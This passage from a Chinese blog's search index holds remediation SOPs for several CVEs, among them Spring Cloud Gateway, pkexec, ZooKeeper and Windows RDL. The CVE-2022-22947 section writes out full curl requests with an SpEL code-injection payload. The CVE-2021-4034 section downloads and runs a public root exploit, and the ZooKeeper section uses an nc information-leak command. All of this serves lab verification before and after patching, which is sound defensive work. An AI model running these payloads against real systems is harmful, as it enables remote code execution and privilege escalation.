启动ez，进入ez web界面-指纹&#x2F;漏洞，越权扫描结果已同步 ​","categories":[],"tags":[{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"}]},{"title":"Zookeeper未授权漏洞修复方案","slug":"Zookeeper未授权漏洞修复方案","date":"2025-03-25T07:12:44.000Z","updated":"2025-03-28T15:44:04.217Z","comments":true,"path":"2025/03/25/Zookeeper未授权漏洞修复方案/","permalink":"http://example.com/2025/03/25/Zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。 ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 1.2影响范围ZooKeeper全版本。","text":"​ 1.漏洞简介1.1漏洞描述ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。 ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 1.2影响范围ZooKeeper全版本。 2.环境搭建2.1漏洞环境搭建检查版本信息，zookeeper版本为3.4.14，属于漏洞覆盖范围内。 3.漏洞验证3.1.envi命令检测使用envi命令发送一个请求，判断是否返回了enviroment。 echo envi|nc 192.168.230.129 2181 4.漏洞修复4.1修改zoo.cfg在&#x2F;zookeeper&#x2F;config&#x2F;zoo.cfg写入一条命令白名单规则。 重启服务。 .&#x2F;zkServer.sh stop .&#x2F;zkServer.sh start 配置白名单后,未授权已无法利用。 4.2ACL配置.&#x2F;zkCli.sh查看acl 通过acl配置ip白名单为需要使用的ip。 5.漏洞复验5.1envi命令检测使用envi命令发送一个请求，判断是否返回了enviroment。 echo envi|nc 192.168.230.129 2181 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2023-6378漏洞修复方案","slug":"CVE-2023-6378漏洞修复方案","date":"2025-03-21T07:32:27.000Z","updated":"2025-03-28T15:47:51.092Z","comments":true,"path":"2025/03/21/CVE-2023-6378漏洞修复方案/","permalink":"http://example.com/2025/03/21/CVE-2023-6378%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述Logback 的接收器在处理远程日志数据时，未对反序列化输入进行严格校验，攻击者可构造恶意序列化数据通过开放的监听端口发送，导致服务崩溃或资源耗尽。 1.2影响范围1.4.x 系列：1.4.0 ≤ 版本 &lt; 1.4.12 1.3.x 系列：1.3.0 ≤ 版本 &lt; 1.3.12 1.2.x 系列：版本 &lt; 1.2.13","text":"​ 1.漏洞简介1.1漏洞描述Logback 的接收器在处理远程日志数据时，未对反序列化输入进行严格校验，攻击者可构造恶意序列化数据通过开放的监听端口发送，导致服务崩溃或资源耗尽。 1.2影响范围1.4.x 系列：1.4.0 ≤ 版本 &lt; 1.4.12 1.3.x 系列：1.3.0 ≤ 版本 &lt; 1.3.12 1.2.x 系列：版本 &lt; 1.2.13 2.环境搭建2.1漏洞环境搭建检查版本信息，logback-classic与logback-core版本为1.2.12，属于漏洞覆盖范围内。 3.漏洞验证3.1查看logback-classic和logback-core版本检查版本信息，logback-classic与logback-core版本为1.2.12，属于漏洞覆盖范围内。 View-tool windows-maven-dependencies 4.漏洞修复4.1升级logback-classic和logback-core针对logback的 CVE-2023-6378 漏洞，建议更新到如下系列对应版本：logback-classic 和 logback-core 的修补版本分别为：1.4.12、1.3.12 和 1.2.13。 修改pom.xml。 (漏洞版本) &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt;&lt;version&gt;1.2.12&lt;&#x2F;version&gt; &lt;!– 漏洞版本 –&gt;&lt;artifactId&gt;logback-core&lt;&#x2F;artifactId&gt;&lt;version&gt;1.2.12&lt;&#x2F;version&gt; (安全版本) &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt;&lt;version&gt;1.4.14&lt;&#x2F;version&gt;&lt;artifactId&gt;logback-core&lt;&#x2F;artifactId&gt;&lt;version&gt;1.4.14&lt;&#x2F;version&gt; Maven重构项目，下载新的依赖。 右键pom.xml-maven-sync project升级。 5.漏洞复验5.1查看logback-classic和logback-core版本检查版本是否更新成功。 View-tool windows-maven-dependencies 已成功通过pom.xml更新logback-classic和logback-cor至1.4.14版本，该版本不受此漏洞影响。 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2022-22947修复方案","slug":"CVE-2022-22947修复方案","date":"2025-03-21T03:37:12.000Z","updated":"2025-03-28T15:51:42.555Z","comments":true,"path":"2025/03/21/CVE-2022-22947修复方案/","permalink":"http://example.com/2025/03/21/CVE-2022-22947%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API ⽹关，它旨在为微服务架构提供⼀种简单有效的统⼀的 API 路由管理⽅式。当启⽤和暴露 Gateway Actuator 端点时，使⽤ Spring Cloud Gateway 的应⽤程序可受到代码注⼊攻击。 远程攻击者可以发出恶意制作的请求，从⽽远程执⾏任意代码。 1.2影响范围Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway 3.0.x &lt; 3.0.7 旧的、不受支持的版本也会受到影响。","text":"​ 1.漏洞简介1.1漏洞描述Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API ⽹关，它旨在为微服务架构提供⼀种简单有效的统⼀的 API 路由管理⽅式。当启⽤和暴露 Gateway Actuator 端点时，使⽤ Spring Cloud Gateway 的应⽤程序可受到代码注⼊攻击。 远程攻击者可以发出恶意制作的请求，从⽽远程执⾏任意代码。 1.2影响范围Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway 3.0.x &lt; 3.0.7 旧的、不受支持的版本也会受到影响。 2.环境搭建2.1漏洞环境搭建测试环境IDEA：intellij IDEA 2024.3.4 检查版本信息，spring cloud gateway版本为3.0.6，属于漏洞覆盖范围内。 3.漏洞验证3.1工具POC检测https://github.com/wh1t3zer/SpringBootVul-GUI/releases 命令whoami 有回显，判断为漏洞存在。 3.2手工POC检测用curl分别发送三个数据包 其中第一个数据包的&quot;id&quot;:&quot;whoami&quot;处whoami为执行的命令。curl -X POST http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;json” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X POST http://127.0.0.1:8080/actuator/gateway/refresh -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X GET http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” 命令whoami 有回显，判断为漏洞存在。 4.漏洞修复4.1通过pom.xml升级gateway版本升级Gateway。 3.1.x版本用户及时升级到3.1.1+ 3.0.x版本用户及时升级到3.0.7+ 修改pom.xml。&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;&#x2F;artifactId&gt;&lt;version&gt;3.0.6&lt;&#x2F;version&gt; &lt;!– 易受攻击的版本 –&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;&#x2F;artifactId&gt;&lt;version&gt;3.0.7&lt;&#x2F;version&gt; &lt;!– 安全版本 –&gt;&lt;&#x2F;dependency&gt; Maven重构项目，下载新的依赖。 检查版本是否更新成功。 View-tool windows-maven-dependencies 已成功通过pom.xml更新gateway至3.0.7版本，该版本不受此漏洞影响。 5.漏洞复验5.1工具POC检测https://github.com/wh1t3zer/SpringBootVul-GUI/releases 版本升级后，漏洞无法利用。 5.2手工POC检测用curl分别发送三个数据包 其中第一个数据包的&quot;id&quot;:&quot;whoami&quot;处whoami为执行的命令。curl -X POST http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;json” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X POST http://127.0.0.1:8080/actuator/gateway/refresh -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X GET http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” 版本升级后，漏洞无法利用。 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2024-38077漏洞修复方案","slug":"CVE-2024-38077漏洞修复方案","date":"2025-03-20T10:34:32.000Z","updated":"2025-03-28T15:58:08.379Z","comments":true,"path":"2025/03/20/CVE-2024-38077漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2024-38077%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"1.漏洞简介1.1漏洞描述根据微软最新披露的远程代码执行超高危漏洞CVE-2024-38077， CVSS评分高达9.8 ，可导致开启了远程桌面许可服务的Windwos服务器完全沦陷。攻击者无需任何前置条件，无需用户交互（零点击）便可直接获取服务器最高权限，执行任意操作。漏洞影响Windows Server 2000到Windows Server 2025所有版本，这一漏洞存在于Windows远程桌面许可管理服务（RDL）中，该服务被广泛部署于开启Windows远程桌面（3389端口）的服务器，用于管理远程桌面连接许可。 1.2影响范围Windows Server 2000到Windows Server 2025所有版本。","text":"1.漏洞简介1.1漏洞描述根据微软最新披露的远程代码执行超高危漏洞CVE-2024-38077， CVSS评分高达9.8 ，可导致开启了远程桌面许可服务的Windwos服务器完全沦陷。攻击者无需任何前置条件，无需用户交互（零点击）便可直接获取服务器最高权限，执行任意操作。漏洞影响Windows Server 2000到Windows Server 2025所有版本，这一漏洞存在于Windows远程桌面许可管理服务（RDL）中，该服务被广泛部署于开启Windows远程桌面（3389端口）的服务器，用于管理远程桌面连接许可。 1.2影响范围Windows Server 2000到Windows Server 2025所有版本。 2.环境搭建2.1漏洞环境搭建检查版本与补丁信息，属于漏洞覆盖范围内。​​​ 3.漏洞验证3.1版本补丁检测检查版本与补丁信息，属于漏洞覆盖范围内。​​​确认版本与补丁，在漏洞影响范围内。 3.2POC检测为了提升效率可以借助公开的漏洞验证程序进行验证。POC地址GitCode - 全球开发者的开源社区,开源代码托管平台GitCode是面向全球开发者的开源社区,包括原创博客,开源代码托管,代码协作,项目管理等。与开发者社区互动,提升您的研发效率和质量。https://gitcode.com/open-source-toolkit/529c6/?utm_source=tools_gitcode&amp;index=bottom&amp;type=card&amp;未开启RDL​​​不存在漏洞。开启RDL​​​​​​​​​​​​​​​​​​存在漏洞。 4.漏洞修复4.1版本升级打开微软CVE-2024-38077补丁包位置，找到对应版本如Windows server 2016的补丁包。Security Update Guide - Microsoft Security Response Centerhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077下载对应版本补丁包如Windows server 2016的KB5040434。​​​​​​​​​​​​​​​​​​命令解压安装。expand -F:* C:\\Users\\admin\\Desktop\\windows10.0-kb5040434-x64_d54a2d3165f2f751ceee94f5a92b8ae70a82b77e.msu C:\\Users\\admin\\Desktop\\​​​​​​​​​​​​​​​​以管理员身份运行cmd。dism &#x2F;online &#x2F;add-package &#x2F;packagepath:”C:\\Users\\admin\\Desktop\\Windows10.0-KB5040434-x64.cab”​​​​​​​​​​​​​​​​如果您在安装过程中遇到“错误：0x800f0823”报错，可参考以下步骤处理。 4.1报错处理方法https://www.catalog.update.microsoft.com/Search.aspx?q=servicing%20stack![](/images/CVE-2024-38077漏洞修复方案/13.png)​​双击安装。重新安装补丁包。dism &#x2F;online &#x2F;add-package &#x2F;packagepath:”C:\\Users\\admin\\Desktop\\Windows10.0-KB5040434-x64.cab”补丁包安装时间较长，安装后，根据提示重启计算机，完成更新。​​​​​​​​​​​​​​​​ 5.漏洞复验5.1版本检测​​完成更新后，检查是否存在相应的安全补丁，如补丁存在，则表示系统不受该漏洞的影响。 5.2POC检测​​编辑打补丁后POC无法利用。​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2021-4034漏洞修复方案","slug":"CVE-2021-4034漏洞修复方案","date":"2025-03-20T10:23:05.000Z","updated":"2025-03-28T15:56:53.814Z","comments":true,"path":"2025/03/20/CVE-2021-4034漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2021-4034%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"1.漏洞简介1.1漏洞描述CVE-2021-4034是一个影响Linux系统的严重安全漏洞，存在于polkit的pkexec程序中。Polkit是一个在类Unix操作系统中控制系统范围权限的组件，pkexec是Polkit的一部分，允许非特权用户根据预定义的策略以特权用户身份运行命令。由于pkexec在特定情况下无法正确处理调用参数计数，攻击者可以通过控制环境变量，诱导pkexec执行任意代码，从而获得系统的root权限。 1.2影响范围Debain stretch policykit-1 &lt; 0.105-18+deb9u2Debain buster policykit-1 &lt; 0.105-25+deb10u1Debain bookworm, bullseye policykit-1 &lt; 0.105-31.1Ubuntu 21.10 (Impish Indri) policykit-1 &lt; 0.105-31ubuntu0.1Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)Ubuntu 20.04 LTS (Focal Fossa) policykit-1 &lt; 0.105-26ubuntu1.2)Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 &lt;0.105-20ubuntu0.18.04.6)Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 &lt;0.105-14.1ubuntu0.5+esm1)Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 &lt;0.105-4ubuntu3.14.04.6+esm1)CentOS 6 polkit &lt; polkit-0.96-11.el6_10.2CentOS 7 polkit &lt; polkit-0.112-26.el7_9.1CentOS 8.0 polkit &lt; polkit-0.115-13.el8_5.1CentOS 8.2 polkit &lt; polkit-0.115-11.el8_2.2CentOS 8.4 polkit &lt; polkit-0.115-11.el8_4.2","text":"1.漏洞简介1.1漏洞描述CVE-2021-4034是一个影响Linux系统的严重安全漏洞，存在于polkit的pkexec程序中。Polkit是一个在类Unix操作系统中控制系统范围权限的组件，pkexec是Polkit的一部分，允许非特权用户根据预定义的策略以特权用户身份运行命令。由于pkexec在特定情况下无法正确处理调用参数计数，攻击者可以通过控制环境变量，诱导pkexec执行任意代码，从而获得系统的root权限。 1.2影响范围Debain stretch policykit-1 &lt; 0.105-18+deb9u2Debain buster policykit-1 &lt; 0.105-25+deb10u1Debain bookworm, bullseye policykit-1 &lt; 0.105-31.1Ubuntu 21.10 (Impish Indri) policykit-1 &lt; 0.105-31ubuntu0.1Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)Ubuntu 20.04 LTS (Focal Fossa) policykit-1 &lt; 0.105-26ubuntu1.2)Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 &lt;0.105-20ubuntu0.18.04.6)Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 &lt;0.105-14.1ubuntu0.5+esm1)Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 &lt;0.105-4ubuntu3.14.04.6+esm1)CentOS 6 polkit &lt; polkit-0.96-11.el6_10.2CentOS 7 polkit &lt; polkit-0.112-26.el7_9.1CentOS 8.0 polkit &lt; polkit-0.115-13.el8_5.1CentOS 8.2 polkit &lt; polkit-0.115-11.el8_2.2CentOS 8.4 polkit &lt; polkit-0.115-11.el8_4.2 2.环境搭建2.1漏洞环境搭建检查版本信息，属于漏洞覆盖范围内 3.漏洞验证3.1版本检测dpkg -l policykit-1 3.2POC检测识别到当前为存在漏洞的版本。为了提升效率可以借助公开的漏洞验证程序进行验证wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gztar -zxvf main.tar.gzcd CVE-2021-4034-main&#x2F;make.&#x2F;cve-2021-4034提权成功，测试可以执行命令 4.漏洞修复4.1在线升级sudo apt-get updatesudo apt-get install policykit-1编辑dpkg -l policykit-1验证升级完成,已更新至安全版本 4.2离线升级https://pkgs.org/download/policykit-1下载对应版本后，离线拷贝至主机policykit-1_0.105-14.1ubuntu0.5+esm1_amd64.deb演示安装升级文件dpkg -i policykit-1_0.105-14.1ubuntu0.5+esm1_amd64.debdpkg -l policykit-1验证升级完成，已更新至安全版本 5.漏洞复验5.1版本检测dpkg -l policykit-1版本检测，不在漏洞影响范围内 5.2POC检测识别到当前为存在漏洞的版本。为了提升效率可以借助公开的漏洞验证程序进行验证wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gztar -zxvf main.tar.gzcd CVE-2021-4034-main&#x2F;make.&#x2F;cve-2021-4034在完成升级后，使用漏洞利用工具尝试，未产生任何效果，表明漏洞已成功修复。","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2024-6678漏洞修复方案","slug":"CVE-2024-6678漏洞修复方案","date":"2025-03-20T09:24:06.000Z","updated":"2025-03-28T15:54:11.748Z","comments":true,"path":"2025/03/20/CVE-2024-6678漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述GitLab 是一个基于 Git 的代码仓库管理平台 攻击者可通过低权限账户或未授权访问，利用 GitLab 的访问控制机制缺陷，以其他用户身份触发 CI&#x2F;CD 管道。具体而言，漏洞涉及 GitLab 的“环境停止操作”功能权限校验不严格，允许攻击者绕过身份验证，模拟高权限用户（如项目维护者或管理员）执行环境停止操作，进而注入恶意代码或篡改流程 1.2影响范围8.14 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.1.7 17.2 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.2.5 17.3 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.3.2","text":"​ 1.漏洞简介1.1漏洞描述GitLab 是一个基于 Git 的代码仓库管理平台 攻击者可通过低权限账户或未授权访问，利用 GitLab 的访问控制机制缺陷，以其他用户身份触发 CI&#x2F;CD 管道。具体而言，漏洞涉及 GitLab 的“环境停止操作”功能权限校验不严格，允许攻击者绕过身份验证，模拟高权限用户（如项目维护者或管理员）执行环境停止操作，进而注入恶意代码或篡改流程 1.2影响范围8.14 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.1.7 17.2 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.2.5 17.3 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.3.2 2.环境搭建2.1Linux下漏洞环境准备检查版本信息，GitLab版本为16.2.1-ce，属于漏洞覆盖范围内cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION 3.漏洞验证3.1版本检测影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2若当前版本在受影响范围内且未升级到修复版本，则存在风险 4.漏洞修复4.1版本升级sudo apt-cache madison gitlab-ce查看所有版本注意不要直接跨大版本升级,否则报错,需要按官方升级文档按顺序依次升级apt install gitlab-ce&#x3D;xx.x.x-ce.0升级后通过命令查看版本是否提高cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION继续重复升级,升级到不被漏洞影响的版本sudo apt install gitlab-ce&#x3D;17.0.5-ce.0sudo apt install gitlab-ce&#x3D;17.3.6-ce.0升级后通过命令查看版本是否提高cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION已升级到Gitlab漏洞影响范围外版本 5.漏洞复验5.1版本检测影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2若当前版本不在受影响范围内或升级到修复版本，则完成修复 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]}],"categories":[],"tags":[{"name":"审计","slug":"审计","permalink":"http://example.com/tags/%E5%AE%A1%E8%AE%A1/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"红队基建","slug":"红队基建","permalink":"http://example.com/tags/%E7%BA%A2%E9%98%9F%E5%9F%BA%E5%BB%BA/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"},{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]}